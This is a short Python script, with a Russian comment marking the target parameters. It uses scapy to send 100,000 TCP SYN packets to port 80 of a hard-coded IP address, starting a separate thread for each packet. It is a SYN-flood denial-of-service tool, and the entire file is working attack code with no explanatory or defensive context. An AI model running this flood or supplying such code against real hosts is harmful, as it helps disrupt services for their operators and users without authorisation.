import threading
from scapy.all import IP, TCP, send

# Параметры цели
target_ip = "5.253.61.100"
target_port = 80
packet_count = 100000

def send_packet():
    packet = IP(dst=target_ip) / TCP(dport=target_port, flags='S')
    send(packet, verbose=0)

threads = []

for _ in range(packet_count):
    thread = threading.Thread(target=send_packet)
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()

print(f"Sent {packet_count} packets to {target_ip}:{target_port}")
